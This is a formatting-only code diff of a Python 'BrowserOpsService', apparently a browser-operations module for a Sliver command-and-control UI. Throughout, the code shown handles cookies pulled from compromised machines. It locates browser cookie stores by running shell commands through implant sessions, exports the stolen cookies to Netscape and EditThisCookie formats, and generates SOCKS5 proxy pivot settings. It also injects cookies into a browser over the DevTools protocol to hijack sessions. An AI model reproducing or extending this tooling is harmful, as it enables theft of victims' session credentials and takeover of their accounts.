@@ -135,7 +135,8 @@ class BrowserOpsService:
         # Filter by domain if specified
         if target_domain and cookies:
             cookies = [
-                c for c in cookies
+                c
+                for c in cookies
                 if target_domain.lower() in c.get("domain", "").lower()
             ]
 
@@ -366,15 +367,19 @@ class BrowserOpsService:
             parts = line.split("|")
             if len(parts) >= 7:
                 try:
-                    cookies.append(self._normalize_cookie({
-                        "domain": parts[0].strip(),
-                        "name": parts[1].strip(),
-                        "value": parts[2].strip(),
-                        "path": parts[3].strip(),
-                        "expires": parts[4].strip(),
-                        "secure": parts[5].strip().lower() in ("1", "true"),
-                        "http_only": parts[6].strip().lower() in ("1", "true"),
-                    }))
+                    cookies.append(
+                        self._normalize_cookie(
+                            {
+                                "domain": parts[0].strip(),
+                                "name": parts[1].strip(),
+                                "value": parts[2].strip(),
+                                "path": parts[3].strip(),
+                                "expires": parts[4].strip(),
+                                "secure": parts[5].strip().lower() in ("1", "true"),
+                                "http_only": parts[6].strip().lower() in ("1", "true"),
+                            }
+                        )
+                    )
                 except (IndexError, ValueError):
                     continue
 
@@ -406,7 +411,8 @@ class BrowserOpsService:
         """Export cookies in the requested format"""
         if domain_filter:
             cookies = [
-                c for c in cookies
+                c
+                for c in cookies
                 if domain_filter.lower() in c.get("domain", "").lower()
             ]
 
@@ -423,7 +429,11 @@ class BrowserOpsService:
 
     def _export_netscape(self, cookies: List[dict]) -> dict:
         """Export in Netscape/Mozilla cookie.txt format"""
-        lines = ["# Netscape HTTP Cookie File", "# Extracted by SliverUI Browser Ops", ""]
+        lines = [
+            "# Netscape HTTP Cookie File",
+            "# Extracted by SliverUI Browser Ops",
+            "",
+        ]
 
         for c in cookies:
             domain = c.get("domain", "")
@@ -441,7 +451,9 @@ class BrowserOpsService:
             name = c.get("name", "")
             value = c.get("value", "")
 
-            lines.append(f"{domain}\t{domain_flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
+            lines.append(
+                f"{domain}\t{domain_flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
+            )
 
         content = "\n".join(lines) + "\n"
         return {
@@ -467,19 +479,21 @@ class BrowserOpsService:
         """Export in EditThisCookie Chrome extension format"""
         etc_cookies = []
         for c in cookies:
-            etc_cookies.append({
-                "domain": c.get("domain", ""),
-                "expirationDate": c.get("expires", ""),
-                "hostOnly": not c.get("domain", "").startswith("."),
-                "httpOnly": c.get("http_only", False),
-                "name": c.get("name", ""),
-                "path": c.get("path", "/"),
-                "sameSite": c.get("same_site", "unspecified"),
-                "secure": c.get("secure", False),
-                "session": not bool(c.get("expires")),
-                "storeId": "0",
-                "value": c.get("value", ""),
-            })
+            etc_cookies.append(
+                {
+                    "domain": c.get("domain", ""),
+                    "expirationDate": c.get("expires", ""),
+                    "hostOnly": not c.get("domain", "").startswith("."),
+                    "httpOnly": c.get("http_only", False),
+                    "name": c.get("name", ""),
+                    "path": c.get("path", "/"),
+                    "sameSite": c.get("same_site", "unspecified"),
+                    "secure": c.get("secure", False),
+                    "session": not bool(c.get("expires")),
+                    "storeId": "0",
+                    "value": c.get("value", ""),
+                }
+            )
 
         content = json.dumps(etc_cookies, indent=2)
         return {
@@ -559,56 +573,66 @@ class BrowserOpsService:
 
             if data.get("Chrome"):
                 running = "chrome" in proc_names
-                browsers.append({
-                    "name": "Google Chrome",
-                    "browser_type": "chrome",
-                    "exe_path": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
-                    "running": running,
-                    "pid": proc_names.get("chrome", [None])[0] if running else None,
-                    "profiles": ["Default"],
-                    "cookie_path": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies",
-                })
+                browsers.append(
+                    {
+                        "name": "Google Chrome",
+                        "browser_type": "chrome",
+                        "exe_path": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                        "running": running,
+                        "pid": proc_names.get("chrome", [None])[0] if running else None,
+                        "profiles": ["Default"],
+                        "cookie_path": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies",
+                    }
+                )
 
             if data.get("Edge"):
                 running = "msedge" in proc_names
-                browsers.append({
-                    "name": "Microsoft Edge",
-                    "browser_type": "edge",
-                    "exe_path": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-                    "running": running,
-                    "pid": proc_names.get("msedge", [None])[0] if running else None,
-                    "profiles": ["Default"],
-                    "cookie_path": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies",
-                })
+                browsers.append(
+                    {
+                        "name": "Microsoft Edge",
+                        "browser_type": "edge",
+                        "exe_path": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                        "running": running,
+                        "pid": proc_names.get("msedge", [None])[0] if running else None,
+                        "profiles": ["Default"],
+                        "cookie_path": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies",
+                    }
+                )
 
             if data.get("Firefox"):
                 running = "firefox" in proc_names
-                browsers.append({
-                    "name": "Mozilla Firefox",
-                    "browser_type": "firefox",
-                    "exe_path": r"C:\Program Files\Mozilla Firefox\firefox.exe",
-                    "running": running,
-                    "pid": proc_names.get("firefox", [None])[0] if running else None,
-                    "profiles": ["default-release"],
-                    "cookie_path": r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite",
-                })
+                browsers.append(
+                    {
+                        "name": "Mozilla Firefox",
+                        "browser_type": "firefox",
+                        "exe_path": r"C:\Program Files\Mozilla Firefox\firefox.exe",
+                        "running": running,
+                        "pid": (
+                            proc_names.get("firefox", [None])[0] if running else None
+                        ),
+                        "profiles": ["default-release"],
+                        "cookie_path": r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite",
+                    }
+                )
 
         except (json.JSONDecodeError, KeyError, TypeError) as e:
             logger.warning(f"Failed to parse browser detection output: {e}")
             # Fallback: basic detection via process list
             ps_result = await self.sliver.session_shell(
-                session_id, "tasklist /FI \"IMAGENAME eq chrome.exe\" /FO CSV", timeout=15
+                session_id, 'tasklist /FI "IMAGENAME eq chrome.exe" /FO CSV', timeout=15
             )
             ps_output = ps_result.get("output", "")
             if "chrome.exe" in ps_output.lower():
-                browsers.append({
-                    "name": "Google Chrome",
-                    "browser_type": "chrome",
-                    "exe_path": "",
-                    "running": True,
-                    "profiles": ["Default"],
-                    "cookie_path": "",
-                })
+                browsers.append(
+                    {
+                        "name": "Google Chrome",
+                        "browser_type": "chrome",
+                        "exe_path": "",
+                        "running": True,
+                        "profiles": ["Default"],
+                        "cookie_path": "",
+                    }
+                )
 
         return browsers
 
@@ -627,28 +651,40 @@ class BrowserOpsService:
 
         has_chrome = bool(re.search(r"---CHROME---\s*\n\s*/", output))
         has_firefox = bool(re.search(r"---FIREFOX---\s*\n\s*/", output))
-        chrome_running = "chrome" in output.split("---PROCS---")[-1].lower() if "---PROCS---" in output else False
-        firefox_running = "firefox" in output.split("---PROCS---")[-1].lower() if "---PROCS---" in output else False
+        chrome_running = (
+            "chrome" in output.split("---PROCS---")[-1].lower()
+            if "---PROCS---" in output
+            else False
+        )
+        firefox_running = (
+            "firefox" in output.split("---PROCS---")[-1].lower()
+            if "---PROCS---" in output
+            else False
+        )
 
         if has_chrome:
-            browsers.append({
-                "name": "Google Chrome",
-                "browser_type": "chrome",
-                "exe_path": "/usr/bin/google-chrome",
-                "running": chrome_running,
-                "profiles": ["Default"],
-                "cookie_path": "~/.config/google-chrome/Default/Cookies",
-            })
+            browsers.append(
+                {
+                    "name": "Google Chrome",
+                    "browser_type": "chrome",
+                    "exe_path": "/usr/bin/google-chrome",
+                    "running": chrome_running,
+                    "profiles": ["Default"],
+                    "cookie_path": "~/.config/google-chrome/Default/Cookies",
+                }
+            )
 
         if has_firefox:
-            browsers.append({
-                "name": "Mozilla Firefox",
-                "browser_type": "firefox",
-                "exe_path": "/usr/bin/firefox",
-                "running": firefox_running,
-                "profiles": ["default-release"],
-                "cookie_path": "~/.mozilla/firefox/*.default-release/cookies.sqlite",
-            })
+            browsers.append(
+                {
+                    "name": "Mozilla Firefox",
+                    "browser_type": "firefox",
+                    "exe_path": "/usr/bin/firefox",
+                    "running": firefox_running,
+                    "profiles": ["default-release"],
+                    "cookie_path": "~/.mozilla/firefox/*.default-release/cookies.sqlite",
+                }
+            )
 
         return browsers
 
@@ -662,32 +698,35 @@ class BrowserOpsService:
 
         # PAC file content
         proxy_pac = (
-            f'function FindProxyForURL(url, host) {{\n'
+            f"function FindProxyForURL(url, host) {{\n"
             f'  return "SOCKS5 {proxy_addr}";\n'
-            f'}}'
+            f"}}"
         )
 
         # Chrome launch command
         browser_launch_cmd = (
             f'chrome --proxy-server="socks5://{proxy_addr}" '
-            f'--user-data-dir=/tmp/proxy-profile '
-            f'--no-first-run --no-default-browser-check'
+            f"--user-data-dir=/tmp/proxy-profile "
+            f"--no-first-run --no-default-browser-check"
         )
 
         # FoxyProxy config
-        foxyproxy_config = json.dumps({
-            "mode": "fixed_servers",
-            "fixed_servers": {
-                "socks": {
-                    "host": host,
-                    "port": port,
-                    "scheme": "socks5",
-                }
-            }
-        }, indent=2)
+        foxyproxy_config = json.dumps(
+            {
+                "mode": "fixed_servers",
+                "fixed_servers": {
+                    "socks": {
+                        "host": host,
+                        "port": port,
+                        "scheme": "socks5",
+                    }
+                },
+            },
+            indent=2,
+        )
 
         # curl example
-        curl_example = f'curl --socks5-hostname {proxy_addr} https://target.com'
+        curl_example = f"curl --socks5-hostname {proxy_addr} https://target.com"
 
         return {
             "proxy_pac": proxy_pac,
@@ -804,8 +843,12 @@ class BrowserOpsService:
 
         elif browser == "firefox":
             commands["linux"] = f'firefox --profile "{profile_dir}" --no-remote'
-            commands["macos"] = f'/Applications/Firefox.app/Contents/MacOS/firefox --profile "{profile_dir}" --no-remote'
-            commands["windows"] = f'"C:\\Program Files\\Mozilla Firefox\\firefox.exe" --profile "{profile_dir}" --no-remote'
+            commands["macos"] = (
+                f'/Applications/Firefox.app/Contents/MacOS/firefox --profile "{profile_dir}" --no-remote'
+            )
+            commands["windows"] = (
+                f'"C:\\Program Files\\Mozilla Firefox\\firefox.exe" --profile "{profile_dir}" --no-remote'
+            )
 
         return commands
 
@@ -855,10 +898,14 @@ class BrowserOpsService:
                 msg_id = 1
 
                 # Enable Network domain
-                await ws.send(json.dumps({
-                    "id": msg_id,
-                    "method": "Network.enable",
-                }))
+                await ws.send(
+                    json.dumps(
+                        {
+                            "id": msg_id,
+                            "method": "Network.enable",
+                        }
+                    )
+                )
                 await ws.recv()
                 msg_id += 1
 
@@ -895,11 +942,15 @@ class BrowserOpsService:
                         except (ValueError, AttributeError):
                             pass
 
-                    await ws.send(json.dumps({
-                        "id": msg_id,
-                        "method": "Network.setCookie",
-                        "params": cdp_cookie,
-                    }))
+                    await ws.send(
+                        json.dumps(
+                            {
+                                "id": msg_id,
+                                "method": "Network.setCookie",
+                                "params": cdp_cookie,
+                            }
+                        )
+                    )
                     resp_raw = await ws.recv()
                     resp_data = json.loads(resp_raw)
                     msg_id += 1
